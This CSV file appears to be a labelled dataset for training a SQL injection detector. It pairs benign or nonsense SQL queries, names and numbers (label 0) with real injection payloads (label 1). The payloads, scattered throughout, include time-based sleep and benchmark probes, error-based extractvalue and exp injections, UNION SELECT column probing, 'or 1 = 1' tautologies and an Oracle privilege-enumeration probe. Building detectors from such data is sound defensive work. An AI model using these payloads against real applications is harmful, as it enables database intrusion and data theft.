Query,Label
SELECT * FROM anybody WHERE full = 'buffalo'  AND  ( conversation = 'rhythm' OR cost = 'merely' ) ,0
1%'   )    )     )   and sleep  (  5  )   and    (    (     (  '%'  =  ',1
SELECT metal ( s )  FROM involved LEFT JOIN,0
veronese vitte,0
"1' where 8860  =  8860 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1
SELECT * FROM biggest,0
"  SELECT * FROM hang WHERE fifteen NOT IN  ( 'three', 'speech', 'furniture' )  ",0
"perdign, el",0
2331,0
8485,0
"1%"" or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"-2314%'   )    )    union all select 4612,4612--",1
SELECT * FROM building WHERE saw IN  ( SELECT general FROM lift ) ,0
"1""   )    )    as isqj where 6344  =  6344 union all select null,null,null,null--",1
"1""  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
SELECT * FROM increase 3 SELECT * FROM train,0
SELECT castle ( s )  FROM with LEFT JOIN,0
"  SELECT stared AS else, poetry AS [sand]  FROM split",0
SELECT AVG ( dot ) FROM planning SELECT SUM ( so ) ,0
SELECT * FROM birthday ORDER BY court DESC,0
esdrs,0
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  GRANTED_ROLE   )    )    FROM DBA_ROLE_PRIVS WHERE GRANTEE  =  SYS.LOGIN_USER   )    )    AND 'i'  =  'i,1
stimson_holbrook@cementosanfranq.ly,0
"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and ""gddl"" like ""gddl",1
"1' where 3339  =  3339 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1
langellotti,0
SELECT * FROM blind WHERE order NOT LIKE 'century%',0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 11514 )  ORDER BY meta_id ASC",0
genvieve,0
mathurin,0
"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,1
select * from users where id  =  1 +$+ or 1  =  1 -- 1,1
desiree,0
SELECT MIN ( grown )  AS weak FROM battle,0
"1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'nopu'  =  'nopu",1
SELECT * FROM alone WHERE    NOT single = 'officer',0
"  SELECT late,six FROM total WHERE compass = 'call' UNION SELECT spread, bare FROM watch",0
or 2 > 1,1
t45o0a35,0
"  SELECT adventure AS soon, facing AS [apple]  FROM choose",0
SELECT * FROM football 3,0
"1""  )   as rgbz where 6687  =  6687 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
